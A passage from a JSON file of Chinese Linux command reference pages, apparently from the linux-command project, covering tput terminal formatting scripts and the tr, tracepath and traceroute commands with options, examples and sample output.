class=\"hljs-params\">tput</span> <span class=\"hljs-params\">sgr0</span>)</span>\n<span class=\"hljs-keyword\">done</span>\n\nprintf <span class=\"hljs-character\">'\\n'</span><span class=\"hljs-constructor\">$(<span class=\"hljs-params\">tput</span> <span class=\"hljs-params\">setaf</span> 2; <span class=\"hljs-params\">tput</span> <span class=\"hljs-params\">setab</span> 0; <span class=\"hljs-params\">tput</span> <span class=\"hljs-params\">bold</span>)</span>'background color show'<span class=\"hljs-constructor\">$(<span class=\"hljs-params\">tput</span> <span class=\"hljs-params\">sgr0</span>)</span><span class=\"hljs-character\">'\\n\\n'</span>\n\n<span class=\"hljs-keyword\">for</span>((i=<span class=\"hljs-number\">0</span>,j=<span class=\"hljs-number\">7</span>; i&lt;=<span class=\"hljs-number\">7</span>; i++,j--)); <span class=\"hljs-keyword\">do</span>\n    echo <span class=\"hljs-constructor\">$(<span class=\"hljs-params\">tput</span> <span class=\"hljs-params\">setaf</span> $<span class=\"hljs-params\">i</span>; <span class=\"hljs-params\">tput</span> <span class=\"hljs-params\">setab</span> $<span class=\"hljs-params\">j</span>; <span class=\"hljs-params\">tput</span> <span class=\"hljs-params\">bold</span>)</span><span class=\"hljs-string\">\"show me the money\"</span><span class=\"hljs-constructor\">$(<span class=\"hljs-params\">tput</span> <span class=\"hljs-params\">sgr0</span>)</span>\n<span class=\"hljs-keyword\">done</span>\n\nexit <span class=\"hljs-number\">0</span>\n</code></pre>\n<p>输出格式控制函数：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">#!/bin/bash</span>\n\n<span class=\"hljs-comment\"># $1 str       print string</span>\n<span class=\"hljs-comment\"># $2 color     0-7 设置颜色</span>\n<span class=\"hljs-comment\"># $3 bgcolor   0-7 设置背景颜色</span>\n<span class=\"hljs-comment\"># $4 bold      0-1 设置粗体</span>\n<span class=\"hljs-comment\"># $5 underline 0-1 设置下划线</span>\n\nfunction format_output(){\n    <span class=\"hljs-attribute\">str</span>=<span class=\"hljs-variable\">$1</span>\n    <span class=\"hljs-attribute\">color</span>=<span class=\"hljs-variable\">$2</span>\n    <span class=\"hljs-attribute\">bgcolor</span>=<span class=\"hljs-variable\">$3</span>\n    <span class=\"hljs-attribute\">bold</span>=<span class=\"hljs-variable\">$4</span>\n    <span class=\"hljs-attribute\">underline</span>=<span class=\"hljs-variable\">$5</span>\n    <span class=\"hljs-attribute\">normal</span>=$(tput sgr0)\n\n    case <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$color</span>\"</span> <span class=\"hljs-keyword\">in</span>\n        0|1|2|3|4|5|6|7)\n            <span class=\"hljs-attribute\">setcolor</span>=$(tput setaf <span class=\"hljs-variable\">$color</span>;) ;;\n        *)\n            <span class=\"hljs-attribute\">setcolor</span>=<span class=\"hljs-string\">\"\"</span> ;;\n    esac\n\n    case <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$bgcolor</span>\"</span> <span class=\"hljs-keyword\">in</span>\n        0|1|2|3|4|5|6|7)\n            <span class=\"hljs-attribute\">setbgcolor</span>=$(tput setab <span class=\"hljs-variable\">$bgcolor</span>;) ;;\n        *)\n            <span class=\"hljs-attribute\">setbgcolor</span>=<span class=\"hljs-string\">\"\"</span> ;;\n    esac\n\n    <span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$bold</span>\"</span> = <span class=\"hljs-string\">\"1\"</span> ]; then\n        <span class=\"hljs-attribute\">setbold</span>=$(tput bold;)\n    <span class=\"hljs-keyword\">else</span>\n        <span class=\"hljs-attribute\">setbold</span>=<span class=\"hljs-string\">\"\"</span>\n    fi\n\n    <span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$underline</span>\"</span> = <span class=\"hljs-string\">\"1\"</span> ]; then\n        <span class=\"hljs-attribute\">setunderline</span>=$(tput smul;)\n    <span class=\"hljs-keyword\">else</span>\n        <span class=\"hljs-attribute\">setunderline</span>=<span class=\"hljs-string\">\"\"</span>\n    fi\n\n    printf <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$setcolor</span><span class=\"hljs-variable\">$setbgcolor</span><span class=\"hljs-variable\">$setbold</span><span class=\"hljs-variable\">$setunderline</span><span class=\"hljs-variable\">$str</span><span class=\"hljs-variable\">$normal</span>\\n\"</span>\n}\n\nformat_output <span class=\"hljs-string\">\"Yesterday Once more\"</span> 2 5 1 1\n\nexit 0\n</code></pre>\n<p>光标属性例子：</p>\n<pre><code class=\"language-shell\">#!/bin/bash\n# clear the screen\ntput clear\n# Move cursor to screen location X,Y (top left is <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">0</span>)\ntput cup <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">15</span>\n# <span class=\"hljs-keyword\">set</span> a <span class=\"hljs-comment\">foreground colour using ANSI escape</span>\ntput <span class=\"hljs-comment\">setaf 3</span>\necho <span class=\"hljs-comment\">\"XYX Corp LTD.\"</span>\ntput <span class=\"hljs-comment\">sgr0</span>\ntput <span class=\"hljs-comment\">cup 5 17</span>\n# <span class=\"hljs-keyword\">Set</span> <span class=\"hljs-comment\">reverse video mode</span>\ntput <span class=\"hljs-comment\">rev</span>\necho <span class=\"hljs-comment\">\"M A I N - M E N U\"</span>\ntput <span class=\"hljs-comment\">sgr0</span>\ntput <span class=\"hljs-comment\">cup 7 15</span>\necho <span class=\"hljs-comment\">\"1\\. User Management\"</span>\ntput <span class=\"hljs-comment\">cup 8 15</span>\necho <span class=\"hljs-comment\">\"2\\. service Management\"</span>\ntput <span class=\"hljs-comment\">cup 9 15</span>\necho <span class=\"hljs-comment\">\"3\\. Process Management\"</span>\ntput <span class=\"hljs-comment\">cup 10 15</span>\necho <span class=\"hljs-comment\">\"4\\. Backup\"</span>\n# <span class=\"hljs-keyword\">Set</span> <span class=\"hljs-comment\">bold mode</span>\ntput <span class=\"hljs-comment\">bold</span>\ntput <span class=\"hljs-comment\">cup 12 15</span>\nread <span class=\"hljs-comment\">-p</span> <span class=\"hljs-comment\">\"Enter your choice [1-4] \"</span> <span class=\"hljs-comment\">choice</span>\ntput <span class=\"hljs-comment\">clear</span>\ntput <span class=\"hljs-comment\">sgr0</span>\ntput <span class=\"hljs-comment\">rc</span>\n\nexit <span class=\"hljs-comment\">0</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "tr",
        "des": "将字符进行替换压缩和删除",
        "body": "<h1 id=\"tr\">tr</h1>\n<p>将字符进行替换压缩和删除</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>tr命令</strong> 可以对来自标准输入的字符进行替换、压缩和删除。它可以将一组字符变成另一组字符，经常用来编写优美的单行命令，作用很强大。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">tr</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c或——complerment：取代所有不属于第一字符集的字符；</span>\n<span class=\"hljs-deletion\">-d或——delete：删除所有属于第一字符集的字符；</span>\n<span class=\"hljs-deletion\">-s或--squeeze-repeats：把连续重复的字符以单独一个字符表示；</span>\n<span class=\"hljs-deletion\">-t或--truncate-set1：先删除第一字符集较第二字符集多出的字符。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  字符集1：指定要转换或删除的原字符集。当执行转换操作时，必须使用参数“字符集2”指定转换的目标字符集。但执行删除操作时，不需要参数“字符集2”；</li>\n<li>  字符集2：指定要转换成的目标字符集。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>将输入字符由大写转换为小写：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"HELLO WORLD\"</span> | <span class=\"hljs-keyword\">tr</span> <span class=\"hljs-string\">'A-Z'</span> <span class=\"hljs-string\">'a-z'</span>\nhello world\n</code></pre>\n<p>'A-Z' 和 'a-z'都是集合，集合是可以自己制定的，例如：'ABD-}'、'bB.,'、'a-de-h'、'a-c0-9'都属于集合，集合里可以使用'\\n'、'\\t'，可以可以使用其他ASCII字符。</p>\n<p>使用tr删除字符：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"hello 123 world 456\"</span> | <span class=\"hljs-keyword\">tr</span> -d <span class=\"hljs-string\">'0-9'</span>\nhello  world \n</code></pre>\n<p>将制表符转换为空格：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">cat</span> text | <span class=\"hljs-keyword\">tr</span> <span class=\"hljs-string\">'\\t'</span> <span class=\"hljs-string\">' '</span>\n</code></pre>\n<p>字符集补集，从输入文本中将不在补集中的所有字符删除：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">echo</span> aa.,a <span class=\"hljs-number\">1</span> b#$bb <span class=\"hljs-number\">2</span> c*/cc <span class=\"hljs-number\">3</span> ddd <span class=\"hljs-number\">4</span> | tr -d -c '<span class=\"hljs-number\">0</span>-<span class=\"hljs-number\">9</span> \\n'\n <span class=\"hljs-attribute\">1</span>  <span class=\"hljs-number\">2</span>  <span class=\"hljs-number\">3</span>  <span class=\"hljs-number\">4</span>\n</code></pre>\n<p>此例中，补集中包含了数字0~9、空格和换行符\\n，所以没有被删除，其他字符全部被删除了。</p>\n<p>用tr压缩字符，可以压缩输入中重复的字符：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"thissss is      a text linnnnnnne.\"</span> | <span class=\"hljs-keyword\">tr</span> -s <span class=\"hljs-string\">' sn'</span>\nthis <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">a</span> text <span class=\"hljs-built_in\">line</span>.\n</code></pre>\n<p>巧妙使用tr做数字相加操作：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">echo</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">2</span> <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">5</span> <span class=\"hljs-number\">6</span> <span class=\"hljs-number\">7</span> <span class=\"hljs-number\">8</span> <span class=\"hljs-number\">9</span> | xargs -n1 | echo $[ $(tr '\\n' '+') <span class=\"hljs-number\">0</span> ]\n</code></pre>\n<p>删除Windows文件“造成”的'^M'字符：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">cat</span> <span class=\"hljs-keyword\">file</span> | <span class=\"hljs-keyword\">tr</span> -s <span class=\"hljs-string\">\"\\r\"</span> <span class=\"hljs-string\">\"\\n\"</span> &gt; new_file\n或\n<span class=\"hljs-keyword\">cat</span> <span class=\"hljs-keyword\">file</span> | <span class=\"hljs-keyword\">tr</span> -d <span class=\"hljs-string\">\"\\r\"</span> &gt; new_file\n</code></pre>\n<p> <strong>tr可以使用的字符类：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-string\">[:alnum:]</span>：字母和数字\n<span class=\"hljs-string\">[:alpha:]</span>：字母\n<span class=\"hljs-string\">[:cntrl:]</span>：控制（非打印）字符\n<span class=\"hljs-string\">[:digit:]</span>：数字\n<span class=\"hljs-string\">[:graph:]</span>：图形字符\n<span class=\"hljs-string\">[:lower:]</span>：小写字母\n<span class=\"hljs-string\">[:print:]</span>：可打印字符\n<span class=\"hljs-string\">[:punct:]</span>：标点符号\n<span class=\"hljs-string\">[:space:]</span>：空白字符\n<span class=\"hljs-string\">[:upper:]</span>：大写字母\n<span class=\"hljs-string\">[:xdigit:]</span>：十六进制字符  \n</code></pre>\n<p>使用方式：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">tr</span> <span class=\"hljs-string\">'[:lower:]'</span> <span class=\"hljs-string\">'[:upper:]'</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "tracepath",
        "des": "追踪目的主机经过的路由信息",
        "body": "<h1 id=\"tracepath\">tracepath</h1>\n<p>追踪目的主机经过的路由信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>tracepath命令</strong> 用来追踪并显示报文到达目的主机所经过的路由信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">tracepath</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  目的主机：指定追踪路由信息的目的主机；</li>\n<li>  端口：指定使用的UDP端口号。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">tracepath</span> www.<span class=\"hljs-number\">58</span>.com\n <span class=\"hljs-attribute\">1</span>:  <span class=\"hljs-number\">192.168.2.10</span> (<span class=\"hljs-number\">192.168.2.10</span>)                           <span class=\"hljs-number\">20</span>.<span class=\"hljs-number\">150</span>ms pmtu <span class=\"hljs-number\">1500</span>\n <span class=\"hljs-attribute\">1</span>:  unknown (<span class=\"hljs-number\">192.168.2.1</span>)                                  <span class=\"hljs-number\">9</span>.<span class=\"hljs-number\">343</span>ms\n <span class=\"hljs-attribute\">2</span>:  <span class=\"hljs-number\">221.6.45.33</span> (<span class=\"hljs-number\">221.6.45.33</span>)                             <span class=\"hljs-number\">34</span>.<span class=\"hljs-number\">430</span>ms\n <span class=\"hljs-attribute\">3</span>:  <span class=\"hljs-number\">221.6.9.81</span> (<span class=\"hljs-number\">221.6.9.81</span>)                               <span class=\"hljs-number\">19</span>.<span class=\"hljs-number\">263</span>ms\n <span class=\"hljs-attribute\">4</span>:  <span class=\"hljs-number\">122.96.66.37</span> (<span class=\"hljs-number\">122.96.66.37</span>)                           <span class=\"hljs-number\">54</span>.<span class=\"hljs-number\">372</span>ms\n <span class=\"hljs-attribute\">5</span>:  <span class=\"hljs-number\">219.158.96.149</span> (<span class=\"hljs-number\">219.158.96.149</span>)                      asymm  <span class=\"hljs-number\">6</span> <span class=\"hljs-number\">128</span>.<span class=\"hljs-number\">526</span>ms\n <span class=\"hljs-attribute\">6</span>:  <span class=\"hljs-number\">123.126.0.66</span> (<span class=\"hljs-number\">123.126.0.66</span>)                          <span class=\"hljs-number\">138</span>.<span class=\"hljs-number\">281</span>ms\n <span class=\"hljs-attribute\">7</span>:  <span class=\"hljs-number\">124.65.57.26</span> (<span class=\"hljs-number\">124.65.57.26</span>)                          <span class=\"hljs-number\">166</span>.<span class=\"hljs-number\">244</span>ms\n <span class=\"hljs-attribute\">8</span>:  <span class=\"hljs-number\">61.148.154.98</span> (<span class=\"hljs-number\">61.148.154.98</span>)                        <span class=\"hljs-number\">103</span>.<span class=\"hljs-number\">723</span>ms\n <span class=\"hljs-attribute\">9</span>:  <span class=\"hljs-number\">202.106.42.102</span> (<span class=\"hljs-number\">202.106.42.102</span>)                      asymm <span class=\"hljs-number\">10</span>  <span class=\"hljs-number\">78</span>.<span class=\"hljs-number\">099</span>ms\n<span class=\"hljs-attribute\">10</span>:  <span class=\"hljs-number\">210.77.139.150</span> (<span class=\"hljs-number\">210.77.139.150</span>)                      asymm  <span class=\"hljs-number\">9</span> <span class=\"hljs-number\">199</span>.<span class=\"hljs-number\">930</span>ms\n<span class=\"hljs-attribute\">11</span>:  <span class=\"hljs-number\">211.151.104.6</span> (<span class=\"hljs-number\">211.151.104.6</span>)                        asymm <span class=\"hljs-number\">10</span> <span class=\"hljs-number\">121</span>.<span class=\"hljs-number\">965</span>ms\n<span class=\"hljs-attribute\">12</span>:  no reply\n<span class=\"hljs-attribute\">13</span>:  <span class=\"hljs-number\">211.151.111.30</span> (<span class=\"hljs-number\">211.151.111.30</span>)                      asymm <span class=\"hljs-number\">12</span> <span class=\"hljs-number\">118</span>.<span class=\"hljs-number\">989</span>ms reached\n     <span class=\"hljs-attribute\">Resume</span>: pmtu <span class=\"hljs-number\">1500</span> hops <span class=\"hljs-number\">13</span> back <span class=\"hljs-number\">12</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "traceroute",
        "des": "显示数据包到主机间的路径",
        "body": "<h1 id=\"traceroute\">traceroute</h1>\n<p>显示数据包到主机间的路径</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>traceroute命令</strong> 用于追踪数据包在网络上的传输时的全部路径，它默认发送的数据包大小是40字节。</p>\n<p>通过traceroute我们可以知道信息从你的计算机到互联网另一端的主机是走的什么路径。当然每次数据包由某一同样的出发点（source）到达某一同样的目的地(destination)走的路径可能会不一样，但基本上来说大部分时候所走的路由是相同的。</p>\n<p>traceroute通过发送小的数据包到目的设备直到其返回，来测量其需要多长时间。一条路径上的每个设备traceroute要测3次。输出结果中包括每次测试的时间(ms)和设备的名称（如有的话）及其ip地址。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">traceroute</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d：使用Socket层级的排错功能；</span>\n<span class=\"hljs-deletion\">-f&lt;存活数值&gt;：设置第一个检测数据包的存活数值TTL的大小；</span>\n<span class=\"hljs-deletion\">-F：设置勿离断位；</span>\n<span class=\"hljs-deletion\">-g&lt;网关&gt;：设置来源路由网关，最多可设置8个；</span>\n<span class=\"hljs-deletion\">-i&lt;网络界面&gt;：使用指定的网络界面送出数据包；</span>\n<span class=\"hljs-deletion\">-I：使用ICMP回应取代UDP资料信息；</span>\n<span class=\"hljs-deletion\">-m&lt;存活数值&gt;：设置检测数据包的最大存活数值TTL的大小；</span>\n<span class=\"hljs-deletion\">-n：直接使用IP地址而非主机名称；</span>\n<span class=\"hljs-deletion\">-p&lt;通信端口&gt;：设置UDP传输协议的通信端口；</span>\n<span class=\"hljs-deletion\">-r：忽略普通的Routing Table，直接将数据包送到远端主机上。</span>\n<span class=\"hljs-deletion\">-s&lt;来源地址&gt;：设置本地主机送出数据包的IP地址；</span>\n<span class=\"hljs-deletion\">-t&lt;服务类型&gt;：设置检测数据包的TOS数值；</span>\n<span class=\"hljs-deletion\">-v：详细显示指令的执行过程；</span>\n<span class=\"hljs-deletion\">-w&lt;超时秒数&gt;：设置等待远端主机回报的时间；</span>\n<span class=\"hljs-deletion\">-x：开启或关闭数据包的正确性检验。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>主机：指定目的主机IP地址或主机名。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">traceroute</span> www.<span class=\"hljs-number\">58</span>.com\n<span class=\"hljs-attribute\">traceroute</span> to www.<span class=\"hljs-number\">58</span>.com (<span class=\"hljs-number\">211.151.111.30</span>), <span class=\"hljs-number\">30</span> hops max, <span class=\"hljs-number\">40</span> byte packets\n <span class=\"hljs-attribute\">1</span>  unknown (<span class=\"hljs-number\">192.168.2.1</span>)  <span class=\"hljs-number\">3</span>.<span class=\"hljs-number\">453</span> ms  <span class=\"hljs-number\">3</span>.<span class=\"hljs-number\">801</span> ms  <span class=\"hljs-number\">3</span>.<span class=\"hljs-number\">937</span> ms\n <span class=\"hljs-attribute\">2</span>  <span class=\"hljs-number\">221.6.45.33</span> (<span class=\"hljs-number\">221.6.45.33</span>)  <span class=\"hljs-number\">7</span>.<span class=\"hljs-number\">768</span> ms  <span class=\"hljs-number\">7</span>.<span class=\"hljs-number\">816</span> ms  <span class=\"hljs-number\">7</span>.<span class=\"hljs-number\">840</span> ms\n <span class=\"hljs-attribute\">3</span>  <span class=\"hljs-number\">221.6.0.233</span> (<span class=\"hljs-number\">221.6.0.233</span>)  <span class=\"hljs-number\">13</span>.<span class=\"hljs-number\">784</span> ms  <span class=\"hljs-number\">13</span>.<span class=\"hljs-number\">827</span> ms <span class=\"hljs-number\">221.6.9.81</span> (<span class=\"hljs-number\">221.6.9.81</span>)  <span class=\"hljs-number\">9</span>.<span class=\"hljs-number\">758</span> ms\n <span class=\"hljs-attribute\">4</span>  <span class=\"hljs-number\">221.6.2.169</span> (<span class=\"hljs-number\">221.6.2.169</span>)  <span class=\"hljs-number\">11</span>.<span class=\"hljs-number\">777</span> ms <span class=\"hljs-number\">122.96.66.13</span> (<span class=\"hljs-number\">122.96.66.13</span>)  <span class=\"hljs-number\">34</span>.<span class=\"hljs-number\">952</span> ms <span class=\"hljs-number\">221.6.2.53</span> (<span class=\"hljs-number\">221.6.2.53</span>)  <span class=\"hljs-number\">41</span>.<span class=\"hljs-number\">372</span> ms\n <span class=\"hljs-attribute\">5</span>  <span class=\"hljs-number\">219.158.96.149</span> (<span class=\"hljs-number\">219.158.96.149</span>)  <span class=\"hljs-number\">39</span>.<span class=\"hljs-number\">167</span> ms  <span class=\"hljs-number\">39</span>.<span class=\"hljs-number\">210</span> ms  <span class=\"hljs-number\">39</span>.<span class=\"hljs-number\">238</span> ms\n <span class=\"hljs-attribute\">6</span>  <span class=\"hljs-number\">123.126.0.194</span> (<span class=\"hljs-number\">123.126.0.194</span>)  <span class=\"hljs-number\">37</span>.<span class=\"hljs-number\">270</span> ms <span class=\"hljs-number\">123.126.0.66</span> (<span class=\"hljs-number\">123.126.0.66</span>)  <span class=\"hljs-number\">37</span>.<span class=\"hljs-number\">163</span> ms  <span class=\"hljs-number\">37</span>.<span class=\"hljs-number\">441</span> ms\n <span class=\"hljs-attribute\">7</span>  <span class=\"hljs-number\">124.65.57.26</span> (<span class=\"hljs-number\">124.65.57.26</span>)  <span class=\"hljs-number\">42</span>.<span class=\"hljs-number\">787</span> ms  <span class=\"hljs-number\">42</span>.<span class=\"hljs-number\">799</span> ms  <span class=\"hljs-number\">42</span>.<span class=\"hljs-number\">809</span> ms\n <span class=\"hljs-attribute\">8</span>  <span class=\"hljs-number\">61.148.146.210</span> (<span class=\"hljs-number\">61.148.146.210</span>)  <span class=\"hljs-number\">30</span>.<span class=\"hljs-number\">176</span> ms <span class=\"hljs-number\">61.148.154.98</span> (<span class=\"hljs-number\">61.148.154.98</span>)  <span class=\"hljs-number\">32</span>.<span class=\"hljs-number\">613</span> ms  <span class=\"hljs-number\">32</span>.<span class=\"hljs-number\">675</span> ms\n <span class=\"hljs-attribute\">9</span>  <span class=\"hljs-number\">202.106.42.102</span> (<span class=\"hljs-number\">202.106.42.102</span>)  <span class=\"hljs-number\">44</span>.<span class=\"hljs-number\">563</span> ms  <span class=\"hljs-number\">44</span>.<span class=\"hljs-number\">600</span> ms  <span class=\"hljs-number\">44</span>.<span class=\"hljs-number\">627</span> ms\n<span class=\"hljs-attribute\">10</span>  <span class=\"hljs-number\">210.77.139.150</span> (<span class=\"hljs-number\">210.77.139.150</span>)  <span class=\"hljs-number\">53</span>.<span class=\"hljs-number\">302</span> ms  <span class=\"hljs-number\">53</span>.<span class=\"hljs-number\">233</span> ms  <span class=\"hljs-number\">53</span>.<span class=\"hljs-number\">032</span> ms\n<span class=\"hljs-attribute\">11</span>  <span class=\"hljs-number\">211.151.104.6</span> (<span class=\"hljs-number\">211.151.104.6</span>)  <span class=\"hljs-number\">39</span>.<span class=\"hljs-number\">585</span> ms  <span class=\"hljs-number\">39</span>.<span class=\"hljs-number\">502</span> ms  <span class=\"hljs-number\">39</span>.<span class=\"hljs-number\">598</span> ms\n<span class=\"hljs-attribute\">12</span>  <span class=\"hljs-number\">211.151.111.30</span> (<span class=\"hljs-number\">211.151.111.30</span>)  <span class=\"hljs-number\">35</span>.<span class=\"hljs-number\">161</span> ms  <span class=\"hljs-number\">35</span>.<span class=\"hljs-number\">938</span> ms  <span class=\"hljs-number\">36</span>.<span class=\"hljs-number\">005</span> ms\n</code></pre>\n<p>记录按序列号从1开始，每个纪录就是一跳&nbsp;，每跳表示一个网关，我们看到每行有三个时间，单位是ms，其实就是<code>-q</code>的默认参数。探测数据包向每个网关发送三个数据包后，网关响应后返回的时间；如果用<code>traceroute&nbsp;-q&nbsp;4&nbsp;www.58.com</code>，表示向每个网关发送4个数据包。</p>\n<p>有时我们traceroute一台主机时，会看到有一些行是以星号表示的。出现这样的情况，可能是防火墙封掉了ICMP的返回信息，所以我们得不到什么相关的数据包返回数据。</p>\n<p>有时我们在某一网关处延时比较长，有可能是某台网关比较阻塞，也可能是物理设备本身的原因。当然如果某台DNS出现问题时，不能解析主机名、域名时，也会&nbsp;有延时长的现象；您可以加<code>-n</code>参数来避免DNS解析，以IP格式输出数据。</p>\n<p>如果在局域网中的不同网段之间，我们可以通过traceroute&nbsp;来排查问题所在，是主机的问题还是网关的问题。如果我们通过远程来访问某台服务器遇到问题时，我们用到traceroute&nbsp;追踪数据包所经过的网关，提交IDC服务商，也有助于解决问题；但目前看来在国内解决这样的问题是比较困难的，就是我们发现问题所在，IDC服务商也不可能帮助我们解决。</p>\n<p><strong>跳数设置</strong></p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># traceroute -m 10 www.baidu.com</span>\ntraceroute to www.baidu.com (<span class=\"hljs-number\">61.135</span>.<span class=\"hljs-number\">169.105</span>), <span class=\"hljs-number\">10</span> hops max, <span class=\"hljs-number\">40</span> byte packets\n <span class=\"hljs-number\">1</span>  <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">74.2</span> (<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">74.2</span>)  <span class=\"hljs-number\">1.534</span> <span class=\"hljs-keyword\">ms</span>  <span class=\"hljs-title\">1</span>.<span class=\"hljs-number\">775</span> <span class=\"hljs-keyword\">ms</span>  <span class=\"hljs-title\">1</span>.<span class=\"hljs-number\">961</span> <span class=\"hljs-keyword\">ms</span>\n <span class=\"hljs-title\">2</span>  <span class=\"hljs-number\">211.151</span>.<span class=\"hljs-number\">56.1</span> (<span class=\"hljs-number\">211.151</span>.<span class=\"hljs-number\">56.1</span>)  <span class=\"hljs-number\">0.508</span> <span class=\"hljs-keyword\">ms</span>  <span class=\"hljs-title\">0</span>.<span class=\"hljs-number\">514</span> <span class=\"hljs-keyword\">ms</span>  <span class=\"hljs-title\">0</span>.<span class=\"hljs-number\">507</span> <span class=\"hljs-keyword\">ms</span>\n <span class=\"hljs-title\">3</span>  <span class=\"hljs-number\">211.151</span>.<span class=\"hljs-number\">227.206</span> (<span class=\"hljs-number\">211.151</span>.<span class=\"hljs-number\">227.206</span>)  <span class=\"hljs-number\">0.571</span> <span class=\"hljs-keyword\">ms</span>  <span class=\"hljs-title\">0</span>.<span class=\"hljs-number\">558</span> <span class=\"hljs-keyword\">ms</span>  <span class=\"hljs-title\">0</span>.<span class=\"hljs-number\">550</span> <span class=\"hljs-keyword\">ms</span>\n <span class=\"hljs-title\">4</span>  <span class=\"hljs-number\">210.77</span>.<span class=\"hljs-number\">139.145</span> (<span class=\"hljs-number\">210.77</span>.<span class=\"hljs-number\">139.145</span>)  <span class=\"hljs-number\">0.708</span> <span class=\"hljs-keyword\">ms</span>  <span class=\"hljs-title\">0</span>.<span class=\"hljs-number\">729</span> <span class=\"hljs-keyword\">ms</span>  <span class=\"hljs-title\">0</span>.<span class=\"hljs-number\">785</span> <span class=\"hljs-keyword\">ms</span>\n <span class=\"hljs-title\">5</span>  <span class=\"hljs-number\">202.106</span>.<span class=\"hljs-number\">42.101</span> (<span class=\"hljs-number\">202.106</span>.<span class=\"hljs-number\">42.101</span>)  <span class=\"hljs-number\">7.978</span> <span class=\"hljs-keyword\">ms</span>  <span class=\"hljs-title\">8</span>.<span class=\"hljs-number\">155</span> <span class=\"hljs-keyword\">ms</span>  <span class=\"hljs-title\">8</span>.<span class=\"hljs-number\">311</span> <span class=\"hljs-keyword\">ms</span>\n <span class=\"hljs-title\">6</span>  bt-<span class=\"hljs-number\">228</span>-<span class=\"hljs-number\">037</span>.bta.net.cn (<span class=\"hljs-number\">202.106</span>.<span class=\"hljs-number\">228.37</span>)  <span class=\"hljs-number\">772.460</span> <span class=\"hljs-keyword\">ms</span> <span class=\"hljs-title\">bt-228-025</span>.bta.net.cn (<span class=\"hljs-number\">202.106</span>.<span class=\"hljs-number\">228.25</span>)  <span class=\"hljs-number\">2.152</span> <span class=\"hljs-keyword\">ms</span> <span class=\"hljs-title\">61</span>.<span class=\"hljs-number\">148.154</span>.<span class=\"hljs-number\">97</span> (<span class=\"hljs-number\">61.148</span>.<span class=\"hljs-number\">154.97</span>)  <span class=\"hljs-number\">772.107</span> <span class=\"hljs-keyword\">ms</span>\n <span class=\"hljs-title\">7</span>  <span class=\"hljs-number\">124.65</span>.<span class=\"hljs-number\">58.221</span> (<span class=\"hljs-number\">124.65</span>.<span class=\"hljs-number\">58.221</span>)  <span class=\"hljs-number\">4.875</span> <span class=\"hljs-keyword\">ms</span> <span class=\"hljs-title\">61</span>.<span class=\"hljs-number\">148.146</span>.<span class=\"hljs-number\">29</span> (<span class=\"hljs-number\">61.148</span>.<span class=\"hljs-number\">146.29</span>)  <span class=\"hljs-number\">2.124</span> <span class=\"hljs-keyword\">ms</span> <span class=\"hljs-title\">124</span>.<span class=\"hljs-number\">65.58</span>.<span class=\"hljs-number\">221</span> (<span class=\"hljs-number\">124.65</span>.<span class=\"hljs-number\">58.221</span>)  <span class=\"hljs-number\">4.854</span> <span class=\"hljs-keyword\">ms</span>\n <span class=\"hljs-title\">8</span>  <span class=\"hljs-number\">123.126</span>.<span class=\"hljs-number\">6.198</span> (<span class=\"hljs-number\">123.126</span>.<span 